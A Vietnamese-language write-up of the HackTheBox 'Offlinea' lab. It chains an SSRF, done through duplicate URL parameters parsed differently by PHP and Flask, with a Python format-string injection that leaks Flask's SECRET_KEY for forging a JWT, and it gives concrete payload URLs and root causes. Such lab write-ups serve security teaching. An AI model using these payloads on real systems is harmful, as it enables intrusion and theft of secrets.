# Phân tích chi tiết bài offlinea hackthebox

## Link bài lab:
**[Offlinea](https://app.hackthebox.com/challenges/Offlinea?tab=play_challenge)**

## Tổng quan luồng xử lý
Ứng dụng Offlinea có chức năng nhận URL từ người dùng, sau đó render nội dung của URL đó thành file PDF.

Ứng dụng được chia thành hai phần chính:

```text
Public PHP: bartender.php
        ↓ gọi nội bộ
Internal Flask: 127.0.0.1:5000/generate
        ↓ Selenium / Headless Chrome render URL thành PDF
SQLite: history + secrets
```

Luồng xử lý tổng quát:

1. Người dùng gửi URL tới bartender.php.
2. bartender.php kiểm tra URL.
3. Nếu URL hợp lệ, PHP gọi Flask service nội bộ tại 127.0.0.1:5000/generate.
4. Flask dùng Selenium/headless Chrome để truy cập URL.
5. Nội dung được render thành PDF.
6. Kết quả được lưu trong thư mục /pdfs/.

---

## Reconnaissance

Khi truy cập ứng dụng, giao diện cho phép người dùng nhập URL để tạo PDF.

Nếu URL bị phát hiện là không hợp lệ hoặc bị block, ứng dụng trả về file:
```text
no_way.pdf
```
Kiểm tra metadata của file PDF cho thấy:

- File là PDF hợp lệ.
- PDF có một trang.
- PDF không bị mã hóa.
- Không chứa JavaScript nhúng.
- Metadata cho thấy PDF được render bởi Chromium/headless browser.
- Trường Title có tham chiếu tới 127.0.0.1:8000/bartender.php.

Chi tiết này cho thấy ứng dụng có cơ chế server-side rendering URL thành PDF. Đây là dấu hiệu quan trọng để định hướng kiểm tra SSRF.

## Phân tích database

File init_db.py tạo hai bảng chính:
```sql
CREATE TABLE IF NOT EXISTS secrets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    secret TEXT NOT NULL
);
```
```sql
CREATE TABLE IF NOT EXISTS history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT NOT NULL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
```
Trong quá trình khởi tạo, ứng dụng đọc nội dung từ flag.txt rồi insert vào bảng secrets.

Nói cách khác:

Bảng history lưu các URL đã được Flask/Selenium truy cập.
Bảng secrets chứa secret của bartender, trong đó có flag.

Vì vậy, mục tiêu cuối cùng là truy cập được endpoint nội bộ có khả năng đọc bảng secrets.

## Phân tích lỗ hổng 

### Lỗ hổng 1: SSRF qua duplicate URL
-Trong file `bartender.php` có đoạn xử lý:
 ```php
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    $urlunsanitized = $_GET['url'];
    if (!no_way_trick_me($urlunsanitized)) {
        header('location: /pdfs/no_way.pdf');
 	exit();
}
```

Ở PHP, khi request có nhiều tham số trùng tên, ví dụ:
```text
?url=http://127.0.0.1:5000/logs&url=https://example.com
```
thì **$_GET['url']** sẽ lấy *giá trị cuối cùng* của tham số url.
Vì vậy, toàn bộ logic kiểm tra URL trong bartender.php sẽ được áp dụng lên tham số url cuối cùng, tức là:
```text
https://example.com
```
Đây là URL hợp lệ, nên có thể bypass được kiểm tra ở phía PHP.

---

Trong Flask service có đoạn:
```py
def scrape():
    name = escape(request.args.get('name'))
    timestamp=request.args.get('time')
    url = request.args.get('url')
    secret = escape(request.args.get('secret'))
    if not validate_url(url):
        return jsonify({'error':'invalid url provided'}),400
    if not name or not secret:
        return jsonify({'error':'No tricks traveller'}),400
    if(peek_website(url,timestamp) == True):
        conn = sqlite3.connect('history.db')
        cursor = conn.cursor()
        cursor.execute("INSERT INTO secrets (name, secret) VALUES (?, ?)", (name, secret))
        conn.commit()
        conn.close()
        return jsonify({'success':'task completed'}),200
    else:
        return jsonify({'error':'task failed'}),500
```

Khác với PHP, Flask/Werkzeug khi gọi:
```text
request.args.get('url')
```
sẽ lấy *giá trị đầu tiên* của tham số url.
Vì vậy, với request có dạng:
```text
?url=http://127.0.0.1:5000/logs&url=https://example.com
```
thì:

* PHP kiểm tra https://example.com
* Flask xử lý http://127.0.0.1:5000/logs

Điều này tạo ra sự khác biệt trong cách parse duplicate parameter giữa PHP và Flask, từ đó dẫn đến SSRF.

Ngoài ra, hàm validate_url(url) chỉ kiểm tra URL có hợp lệ về mặt định dạng, nhưng không chặn địa chỉ nội bộ như:
```text
127.0.0.1
localhost
0.0.0.0
```
Do đó, attacker có thể khiến Flask service truy cập vào các endpoint nội bộ.

*Kết luận:* Có thể lợi dụng duplicate url parameter để bypass kiểm tra ở PHP và ép Flask truy cập các URL nội bộ, dẫn đến SSRF.

---

### Lỗ hổng 2: Format string injection trong /logs
Endpoint /logs sử dụng hàm `logify()` để format dữ liệu lịch sử truy cập:
```py
def logify(rec):
    row_separator = '\n'
    history = [f"ID: {row[0]} | URL: {row[1]} | Timestamp: {row[2]}" for row in rec]
    history_1 = row_separator.join(history)
    log = history_1.format(logify=logify)
    return log
```
Ở đây, dữ liệu URL trong bảng history được đưa vào chuỗi history_1.

Sau đó, chương trình gọi:
```text
history_1.format(logify=logify)
```
Điều này rất nguy hiểm, vì nếu attacker có thể ghi payload chứa {...} vào trường URL trong bảng history, thì payload đó sẽ được Python .format() xử lý.
Ví dụ payload có thể truy cập vào global scope của hàm logify:
```text
{logify.__globals__[app].config[SECRET_KEY]}
```
Payload này có thể dùng để đọc giá trị SECRET_KEY trong Flask config.

---

Endpoint /logs có đoạn xử lý:
```py
def logs():
    query = f"SELECT * from history"
    try:
        conn = sqlite3.connect('history.db')
        cursor = conn.cursor()
        cursor.execute(query)
        rec = cursor.fetchall()
        log = logify(rec)
        conn.close()
        return render_template("bartender.html",log_data=log)

    except sqlite3.Error as e:
        return jsonify({'error','An error occured while handling memory'})
```
Endpoint này lấy toàn bộ dữ liệu từ bảng history, sau đó truyền vào logify(rec).

Vì trường URL trong history có thể chứa payload do attacker kiểm soát, nên khi /logs được gọi, payload sẽ được .format() resolve.

*Kết luận:* Đây là lỗi format string injection trong Python, cho phép attacker đọc dữ liệu nhạy cảm từ Flask application context, cụ thể là SECRET_KEY.

---

### Chain attack
Bước 1: Ghi payload leak SECRET_KEY vào bảng history
Payload:
```text
/bartender.php?url=http://127.0.0.1:5000/%7Blogify.__globals__%5Bapp%5D.config%5BSECRET_KEY%5D%7D&name=a&secret=b&url=https://example.com
```
Sau khi URL decode, phần URL đầu tiên tương ứng với:

```text
http://127.0.0.1:5000/{logify.__globals__[app].config[SECRET_KEY]}
```
Mục đích của payload:

* Tham số url thứ hai là URL hợp lệ dùng để bypass kiểm tra trong bartender.php:

    ```text
    https://example.com
    ```


* Tham số url đầu tiên là URL nội bộ được Flask xử lý và lưu vào bảng history:

    ```text
    http://127.0.0.1:5000/{logify.__globals__[app].config[SECRET_KEY]}
    ```


Khi payload này được lưu vào history, nó chưa leak ngay SECRET_KEY. Payload chỉ được thực thi khi endpoint /logs gọi hàm .format().

---

Bước 2: Truy cập /logs thông qua SSRF để trigger format string
Payload:
```text
/bartender.php?url=http://127.0.0.1:5000/logs&name=a&secret=b&url=https://example.com
```
Mục đích:
* Tham số url thứ hai dùng để bypass kiểm tra phía PHP.
* Tham số url đầu tiên khiến Flask truy cập endpoint nội bộ:

    ```text
    http://127.0.0.1:5000/logs
    ```

Khi /logs được gọi:

1. Flask đọc dữ liệu từ bảng history.
2. Hàm logify() nối các dòng log lại.
3. .format(logify=logify) được gọi.
4. Payload {logify.__globals__[app].config[SECRET_KEY]} được resolve.
5. Giá trị SECRET_KEY bị leak ra trong nội dung PDF.

Sau khi request thành công, server redirect tới file:

```text
/pdfs/results-<timestamp>.pdf
```

Trong PDF sẽ xuất hiện URL đã được format, ví dụ:

```text
http://127.0.0.1:5000/<SECRET_KEY>
```

Từ đó có thể lấy được giá trị SECRET_KEY.

---

Bước 3: Sử dụng SECRET_KEY để Forge JWT

Sau khi có được SECRET_KEY, attacker có thể sử dụng nó để ký JWT hợp lệ.

JWT này sẽ được dùng để truy cập endpoint nội bộ yêu cầu token.

---

Bước 4: gọi /batender nội bộ bằng token đã forge
Payload:

```text
/bartender.php?url=http://127.0.0.1:5000/batender?token=TOKEN&name=a&secret=b&url=https://example.com
```

Trong đó:

```text
TOKEN
```
là JWT đã được forge bằng SECRET_KEY leak được ở bước trước.

Mục đích:

* Tham số url thứ hai dùng để bypass kiểm tra phía PHP:

    ```text
    https://example.com
    ```



* Tham số url đầu tiên được Flask/Selenium truy cập nội bộ:

    ```text
    http://127.0.0.1:5000/batender?token=TOKEN
    ```


Nếu JWT hợp lệ, endpoint /batender sẽ trả về nội dung chứa flag.

Khi request thành công, server redirect tới:

```text
/pdfs/results-<timestamp>.pdf
```

Mở file PDF này sẽ lấy được flag.

## Root cause

Có ba nguyên nhân chính dẫn đến lỗ hổng.

1. Inconsistent duplicate parameter parsing

    PHP và Flask xử lý duplicate query parameter khác nhau:

    PHP:   lấy url cuối cùng
    Flask: lấy url đầu tiên

    Điều này khiến validation ở PHP không còn đảm bảo đúng URL mà Flask thực sự xử lý.

2. SSRF protection không đồng nhất

    PHP có kiểm tra private/reserved IP, nhưng Flask lại chỉ kiểm tra URL ở mức cơ bản.

    Kết quả là attacker có thể bypass lớp kiểm tra ở PHP rồi ép Flask truy cập localhost.

3. Gọi .format() trên dữ liệu không tin cậy

    Hàm logify() gọi: `history_1.format(logify=logify)` trên dữ liệu lấy từ bảng history.

    Trong khi đó, dữ liệu trong history có thể bị attacker kiểm soát thông qua URL.

    Đây là nguyên nhân dẫn đến Python format string injection.
